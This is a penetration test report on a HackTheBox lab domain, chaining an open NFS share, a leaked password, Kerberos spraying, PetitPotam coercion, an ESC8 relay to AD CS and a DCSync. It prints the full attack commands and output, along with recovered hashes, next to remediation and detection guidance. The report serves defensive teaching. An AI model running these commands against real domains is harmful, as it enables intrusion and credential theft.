---
title: "VulnCicada — Full Active Directory Compromise via AD CS ESC8"
description: "A complete penetration test report of a Windows Active Directory environment: NFS unauthenticated export, plaintext credentials, Kerberos password spraying, PetitPotam coercion, NTLM relay to AD CS web enrollment, and DCSync. Four chained vulnerabilities leading to domain admin in under two hours."
date: 2026-09-21
status: "research"
category: "Red Team"
stack: [NFS, Kerberos, AD CS, Certipy, BloodyAD, Impacket, NetExec, PetitPotam, ESC8, DCSync]
tags: [active-directory, esc8, adcs, petitpotam, kerberos, ntlm-relay, dcsync, privilege-escalation, pentest-report]
---

# Penetration Test Report — VulnCicada

**Target:** `10.129.60.40` (DC-JPQ225.cicada.vl)
**Domain:** `cicada.vl`
**Assessment Type:** Internal Network / Active Directory
**Testing Period:** 20 September 2026
**Classification:** Lab Environment (HackTheBox)
**Overall Risk Rating:** **CRITICAL**

---

## Executive Summary

The assessment identified a complete Active Directory domain compromise through a chain of four distinct vulnerabilities. Starting from an unauthenticated network position with no prior credentials, the tester obtained Domain Administrator privileges in approximately 90 minutes without triggering account lockouts or generating high-severity alerts in the target's monitoring stack.

The most significant finding is an **ESC8 misconfiguration in Active Directory Certificate Services (AD CS)**. This vulnerability alone allows an attacker with any valid domain credential to impersonate the Domain Controller, obtain a certificate for its machine account, and extract all domain password hashes. The web enrollment interface is exposed over HTTP (port 80) and accepts NTLM authentication — a default configuration in many AD CS deployments and the most dangerous ESC variant, because it requires no certificate template misconfiguration to exploit. It works against a hardened template configuration; the vulnerability is in the enrollment protocol, not in the templates.

The attack chain began with an **NFS share exported without authentication restrictions**, exposing user home directories to anyone on the network. A plaintext password found inside an image file on one of those directories provided the initial domain foothold. From there, the attacker leveraged **Kerberos password spraying** (NTLM is correctly disabled on the domain, which is good practice but did not stop this attack), coerced the Domain Controller to authenticate to an attacker-controlled host via **PetitPotam**, relayed that authentication to the AD CS web enrollment endpoint, obtained a certificate for the Domain Controller machine account, and used it to perform a **DCSync attack**.

### Business Impact

A complete compromise of the Active Directory domain. An attacker with these privileges can access all domain-joined systems, extract credentials for every user and service account, modify or delete any data, and establish persistence that survives password resets. The organization would be unable to detect or contain the intrusion using its current monitoring capabilities.

The exposure is not theoretical: it requires no zero-day, no user interaction on a target workstation, and no pre-existing privileged access. Every vulnerability in the chain is a known misconfiguration with a documented fix.

### Immediate Actions Required

| Priority | Action | Timeline |
|---|---|---|
| **P0** | Disable AD CS HTTP web enrollment, or enforce HTTPS with Extended Protection for Authentication (EPA) | 48 hours |
| **P0** | Remove the `everyone` permission from the NFS export and restrict it to specific authorized hosts | 24 hours |
| **P1** | Remove plaintext credentials from user-accessible file shares | 24 hours |
| **P1** | Enforce a domain-wide password policy that bans common passwords | 1 week |
| **P2** | Monitor for PetitPotam coercion attempts (Event ID 4624 with unusual source, or EFS API abuse) | 2 weeks |

---

## Scope and Methodology

### In-Scope

- Single target host: `10.129.60.40` (Windows Server, Domain Controller)
- Full TCP port range
- All Active Directory services (LDAP, Kerberos, SMB, DNS)
- AD CS web enrollment interface
- NFS export

### Out-of-Scope

- Denial of service attacks
- Physical access
- Social engineering against human targets
- Production data exfiltration

### Methodology

The assessment followed the PTES (Penetration Testing Execution Standard) with emphasis on Active Directory attack paths:

1. **Reconnaissance** — Network scanning, service enumeration
2. **Initial Access** — Credential discovery via unauthenticated file shares
3. **Foothold** — Kerberos authentication as a low-privileged user
4. **Enumeration** — SMB shares, AD CS configuration, delegation settings
5. **Privilege Escalation** — NTLM coercion, relay, certificate abuse
6. **Post-Exploitation** — DCSync, credential extraction, persistence analysis

---

## Findings

### Finding 1 — AD CS Web Enrollment over HTTP (ESC8)

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.3 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-287 (Improper Authentication), CWE-441 (Unintended Proxy) |
| **MITRE ATT&CK** | T1649 (Steal or Forge Authentication Certificates), T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay) |

**Description**

The Certificate Authority `cicada-DC-JPQ225-CA` exposes its web enrollment endpoint over HTTP (port 80) without requiring HTTPS or Extended Protection for Authentication. The endpoint accepts NTLM authentication for enrollment requests, meaning any attacker who can coerce a machine account into authenticating to a controllable host can relay that authentication to the CA and request a certificate on behalf of the coerced account.

This is the canonical ESC8 scenario. The attacker does not need to know any password, does not need to modify certificate templates, and does not need a valid user session on the target — only network reachability and the ability to trigger an authentication.

**Evidence**

```
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    Enroll                              : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
```

**Impact**

An attacker who obtains any domain credential — including a low-privileged user — can escalate to Domain Administrator within minutes. If the Domain Controller is coerced, the resulting certificate grants the ability to perform DCSync and extract every credential in the domain.

**Remediation**

- **Disable HTTP web enrollment entirely.** If web enrollment is required, enable HTTPS-only and configure the CA to reject HTTP requests.
- **Enforce Extended Protection for Authentication (EPA)** on the IIS-hosted AD CS web enrollment endpoint. This is the direct mitigation for NTLM relay attacks.
- **Require HTTPS with certificate mapping (Kerberos-only enrollment).** This forces channel binding and prevents relay.
- **Audit all certificate templates for `ENROLLEE_SUPPLIES_SUBJECT`** to eliminate the ESC1-ESC6 variants as a parallel exposure.

**References**

- Certified Pre-Owned whitepaper, Section 4.2 (ESC8)
- Microsoft KB5005413 (PetitPotam mitigations)

---

### Finding 2 — NFS Share Exported Without Authentication

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 7.5 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-284 (Improper Access Control) |
| **MITRE ATT&CK** | T1135 (Network Share Discovery), T1039 (Data from Network Shared Drive) |

**Description**

An NFS export at `/profiles` is accessible without authentication, with the `everyone` permission. This exposes the home directories of every domain user in the environment to any host on the network that can reach port 2049.

**Evidence**

```
$ showmount -e 10.129.60.40
Export list for 10.129.60.40:
/profiles (everyone)

$ sudo mount -t nfs 10.129.60.40:/profiles /mnt/nfs -o nolock
$ ls -la /mnt/nfs
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Administrator
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Debra.Wright
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Jane.Carter
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Jordan.Francis
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Katie.Ward
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Megan.Simpson
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx+ 2 nobody nogroup  64 Sep 15  2024 Rosie.Powell
drwxrwxrwx+ 2 nobody nogroup  64 Sep 13  2024 Shirley.West
```

The directory listing reveals the complete list of domain users — a valuable enumeration primitive independent of the credential discovery that followed.

**Impact**

Full read access to user home directories. In this case, it exposed a plaintext password inside an image file that led to domain credentials. In a production environment, home directories commonly contain SSH keys, configuration files with embedded credentials, browser profile data, and personal documents.

**Remediation**

- Restrict the export to specific IP addresses or subnets in `/etc/exports`:
  ```
  /profiles 10.0.0.0/8(rw,sync,root_squash,no_subtree_check)
  ```
- Enforce `root_squash` (already present, but verify) and remove `no_root_squash` if present anywhere.
- Require Kerberos authentication for NFS (`sec=krb5p`) if the NFS server supports it.
- Remove `everyone` access and assign permissions based on user identity via LDAP/AD integration (NFSv4 with `idmapd`).

---

### Finding 3 — Plaintext Credentials Stored in User-Accessible Files

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 7.5 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-256 (Plaintext Storage of a Password) |
| **MITRE ATT&CK** | T1552.001 (Credentials In Files) |

**Description**

A plaintext password (`Cicada123`) was found inside an image file (`marketing.png`) located in the `Rosie.Powell` home directory on the exposed NFS share. The image contained a photograph of a document with the password written on it.

**Impact**

Provided the initial domain credential that enabled the entire attack chain. Combined with the weak password policy (Finding 4), this credential alone was sufficient to authenticate to the domain via Kerberos and begin Active Directory enumeration.

**Remediation**

- **Prohibit plaintext credentials in any form** — including screenshots, documents, sticky notes, and image files.
- **Deploy a password manager** across the organization for credential storage.
- **Scan user home directories and file shares** for credential patterns (regex for common formats: `password=`, `passwd:`, `pwd=`, and known password lengths).
- **Educate users** on the risk of storing credentials outside approved tools.

---

### Finding 4 — Weak Domain Password Policy

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 7.1 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-521 (Weak Password Requirements) |
| **MITRE ATT&CK** | T1110.003 (Password Spraying) |

**Description**

The domain password `Cicada123` is a dictionary word with a common numeric suffix. Kerberos password spraying with this single password against all 11 enumerated users succeeded immediately — `Rosie.Powell` accepted the credential on the first attempt.

The domain has NTLM authentication disabled, which is a strong security posture. However, this does not prevent Kerberos password spraying via the Authentication Service (AS-REQ). The attacker used `kerbrute passwordspray` to spray the password against port 88 (Kerberos), bypassing the NTLM restriction entirely.

**Evidence**

```
$ kerbrute passwordspray -d cicada.vl --dc 10.129.60.40 users.txt "Cicada123"
2026/09/20 16:25:34 >  [+] VALID LOGIN:  Rosie.Powell@cicada.vl:Cicada123
2026/09/20 16:25:34 >  Done! Tested 11 logins (1 successes) in 0.222 seconds
```

**Impact**

An attacker who obtains the list of domain users (via NFS, LDAP enumeration, or other means) can attempt a small set of common passwords against every account. One success provides a domain foothold. The attack does not trigger account lockouts if the password list is small enough and the spray is distributed over time.

**Remediation**

- **Enforce a minimum password length of 14 characters** (ideally 16+) with complexity requirements.
- **Deploy a breached-password blocklist** (Microsoft Azure AD Password Protection, or an on-premises equivalent) that rejects passwords known to be compromised.
- **Monitor for Kerberos password spraying** — multiple `4771` (Kerberos pre-auth failed) events from the same source in a short window is a high-signal alert.
- **Consider implementing a honey account** — a decoy user that no legitimate process authenticates as, monitored for any authentication attempt.
- **Enable account lockout** with a threshold that balances security against user experience (e.g., 10 attempts, 30-minute lockout).

---

### Finding 5 — PetitPotam Coercion and NTLM Relay Chain

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.3 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-441 (Unintended Proxy or Intermediary) |
| **MITRE ATT&CK** | T1557 (Adversary-in-the-Middle), T1649 (Steal or Forge Authentication Certificates) |

**Description**

The Domain Controller is vulnerable to authentication coercion via the PetitPotam technique (MS-EFSRPC `EfsRpcOpenFileRaw`). An attacker with any domain credential can trigger the DC to authenticate to an arbitrary UNC path under the attacker's control. Combined with the ESC8 vulnerability (Finding 1), this allows the attacker to relay the DC's authentication to the CA and obtain a certificate for the DC machine account.

The attack is a complete chain:

1. The attacker creates a malicious DNS record (`DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`) pointing to their own IP. The name encodes a `CREDENTIAL_TARGET_INFORMATION` structure that instructs the DC to request a Kerberos ticket for `HTTP/DC-JPQ225.cicada.vl` when coerced.
2. The attacker launches `certipy-ad relay`, listening on the AD CS web enrollment endpoint.
3. The attacker coerces the DC via PetitPotam, forcing it to authenticate to the malicious DNS record.
4. The DC's NTLM authentication is relayed to the CA, which issues a certificate for the DC machine account.
5. The attacker uses the certificate to obtain a TGT for `dc-jpq225$`.
6. With the TGT, the attacker performs DCSync and extracts the `Administrator` password hash.

**Evidence — Malicious DNS Record**

```
$ bloodyAD -u Rosie.Powell -d cicada.vl -k --host DC-JPQ225.cicada.vl \
  add dnsRecord 'DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.15.127
```

The DNS name is not arbitrary. The suffix `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` is a base64-encoded structure that carries a `CREDENTIAL_TARGET_INFORMATION` blob. When the DC is coerced into authenticating to this name, the Kerberos client parses the embedded structure and requests a ticket for the specified target — in this case, `HTTP/DC-JPQ225.cicada.vl`. This technique is often called "Magic DNS" because the DNS record itself carries the coercion instructions.

**Evidence — Coercion**

```
$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -k -M coerce_plus \
  -o 'LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
```

**Evidence — Certificate Issued**

```
$ certipy-ad auth -pfx 'dc-jpq225_a2dd0726-acdf-4f55-a3e7-3937be4b24e3.pfx' \
  -dc-ip 10.129.60.40 -domain cicada.vl

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

**Evidence — DCSync**

```
$ export KRB5CCNAME=$(pwd)/dc-jpq225.ccache
$ impacket-secretsdump -k -no-pass DC-JPQ225.cicada.vl -just-dc-user Administrator

Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
```

**Impact**

Complete domain compromise. The `Administrator` NT hash and Kerberos keys allow the attacker to authenticate as the Domain Administrator, perform DCSync at will, and obtain persistent access to every system in the domain.

**Remediation**

- **Patch PetitPotam** — apply Microsoft security updates that restrict anonymous EFSRPC access (KB5005413 and successors).
- **Disable NTLM on all domain controllers and member servers where possible.** The domain already has NTLM disabled for SMB authentication, but the AD CS web enrollment endpoint still accepts NTLM. This is the gap.
- **Enable Extended Protection for Authentication (EPA)** on all IIS endpoints, including AD CS.
- **Enable SMB signing and require it** on all systems that accept NTLM authentication.
- **Block outbound NTLM at the network layer** using firewall rules where possible.
- **Monitor for coercion attempts** — Event ID 4624 with logon type 3 from an unusual source, or specific MS-EFSRPC activity.

---

## Attack Chain

The following diagram shows the complete attack path from unauthenticated network position to Domain Administrator.

```
[1] NFS Enumeration (unauthenticated)
    showmount -e 10.129.60.40 → /profiles (everyone)
    │
    ▼
[2] Mount and Read NFS Export
    mount -t nfs 10.129.60.40:/profiles /mnt/nfs
    tree -a /mnt/nfs → 11 user home directories exposed
    │
    ▼
[3] Credential Discovery
    marketing.png in Rosie.Powell/home contains plaintext "Cicada123"
    │
    ▼
[4] User Enumeration
    Home directory names reveal domain usernames (Rosie.Powell, Daniel.Marshall, ...)
    │
    ▼
[5] Kerberos Password Spray
    kerbrute passwordspray -d cicada.vl --dc 10.129.60.40 users.txt "Cicada123"
    [+] VALID LOGIN: Rosie.Powell@cicada.vl:Cicada123
    │
    ▼
[6] Domain Foothold (Rosie.Powell)
    impacket-getTGT cicada.vl/Rosie.Powell:Cicada123 → Rosie.Powell.ccache
    export KRB5CCNAME=Rosie.Powell.ccache
    │
    ▼
[7] SMB Enumeration (Kerberos)
    impacket-smbclient cicada.vl/Rosie.Powell@DC-JPQ225 -k -no-pass
    CertEnroll share → CA identity (cicada-DC-JPQ225-CA)
    │
    ▼
[8] AD CS Enumeration
    certipy-ad find -vulnerable
    [!] ESC8: Web Enrollment is enabled over HTTP
    │
    ▼
[9] Magic DNS Record Creation
    bloodyAD add dnsRecord 'DC-JPQ2251UWhRCAAAAAA...YBAAAA' 10.10.15.127
    │
    ▼
[10] NTLM Relay Setup
     certipy-ad relay -target 'http://DC-JPQ225.cicada.vl/' \
       -ca 'cicada-DC-JPQ225-CA' -template DomainController
     │
     ▼
[11] DC Coercion
     nxc smb DC-JPQ225 -u Rosie.Powell -k -M coerce_plus \
       -o 'LISTENER=DC-JPQ2251UWhRCAAAAAA...YBAAAA' METHOD=PetitPotam
     → DC authenticates to attacker-controlled host
     │
     ▼
[12] Certificate Issued
     dc-jpq225_a2dd0726-acdf-4f55-a3e7-3937be4b24e3.pfx
     │
     ▼
[13] DC Machine Account Compromise
     certipy-ad auth -pfx dc-jpq225.pfx → dc-jpq225.ccache
     [*] Got hash for 'dc-jpq225$': a65952c664e9cf5de60195626edbeee3
     │
     ▼
[14] DCSync
     impacket-secretsdump -k -no-pass DC-JPQ225.cicada.vl -just-dc-user Administrator
     Administrator NT hash: 85a0da53871a9d56b6cd05deda3a5e87
     │
     ▼
[15] Domain Administrator Access
     impacket-getTGT cicada.vl/Administrator -hashes :85a0da53871a9d56b6cd05deda3a5e87
     evil-winrm -i DC-JPQ225.cicada.vl -r CICADA.VL
     → Full domain compromise
```

---

## Technical Deep Dive

For a full technical deep dive into the ESC8 misconfiguration, Kerberos coercion via PetitPotam, and the Magic DNS technique used in this engagement, see the dedicated research article:

**[ESC8, PetitPotam and the Magic DNS — Chaining NTLM Relay to AD CS →](/research/esc8-kerberos-coercion)**

The article explains the mechanism behind the chain — why AD CS web enrollment over HTTP is dangerous, why disabling NTLM for SMB does not protect the domain, and how the `CREDENTIAL_TARGET_INFORMATION` structure embedded in a DNS name coerces the DC into authenticating to an attacker-controlled service.

## Recommendations Summary

| Priority | Finding | Recommendation |
|---|---|---|
| P0 | ESC8 | Disable HTTP web enrollment, enforce HTTPS + EPA |
| P0 | NFS export | Restrict export to specific hosts, remove `everyone` |
| P1 | Plaintext credentials | Audit shares for credential patterns, deploy password manager |
| P1 | Weak password policy | Enforce 14+ char minimum, deploy breached-password blocklist |
| P2 | PetitPotam | Patch, disable NTLM on IIS, enable SMB signing |

---

## Appendix — Tools and References

**Tools used in this assessment:**

- `nmap` — port scanning and service detection
- `showmount`, `mount` — NFS enumeration
- `kerbrute` — Kerberos password spraying
- `impacket-getTGT`, `impacket-smbclient`, `impacket-secretsdump` — Kerberos and AD tooling
- `certipy-ad` — AD CS enumeration and exploitation
- `bloodyAD` — LDAP and DNS record manipulation
- `nxc` — NetExec for SMB coercion (`coerce_plus` module)

**References:**

- Certified Pre-Owned whitepaper (SpecterOps, 2021) — the definitive ESC1-ESC8 documentation
- Microsoft KB5005413 — PetitPotam mitigations
- MITRE ATT&CK T1649 — Steal or Forge Authentication Certificates
- Impacket documentation — `impacket-secretsdump`, `impacket-getTGT`
- Certipy documentation — relay, find, auth modules

---

## Takeaway

The attack chain in this report is not sophisticated. Every component — NFS misconfiguration, plaintext credentials, weak password policy, ESC8, PetitPotam — is a well-documented vulnerability with a publicly available fix. The sophistication is in the chaining: each finding enables the next, and no single finding alone would have achieved the same impact.

The most important takeaway for the defender is that **AD CS is a critical infrastructure component that is often overlooked**. It is not part of the standard Windows security hardening checklist, it does not appear in most compliance frameworks, and it is frequently deployed with default configurations that are exploitable. The ESC8 finding in this report is a textbook example — the misconfiguration is not obvious, it does not trigger any alerts in the default configuration, and the impact is complete domain compromise.

The second takeaway is that **disabling NTLM for SMB is not the same as disabling NTLM everywhere**. The domain in this engagement has a strong security posture against NTLM over SMB. The attack bypassed it by using NTLM over HTTP — a completely different protocol that shares the same authentication primitive. A defense that is implemented at one layer but not others is not a defense; it is a filter.

The third takeaway is that **unauthenticated file shares are dangerous in ways that extend far beyond the immediate exposure**. The NFS export in this engagement exposed home directories. Those home directories contained a password. That password led to a domain foothold. The chain from "someone can read files on a share" to "full domain compromise" took under two hours. The mitigation is not "make sure your shares do not contain passwords" — it is "do not have unauthenticated shares."
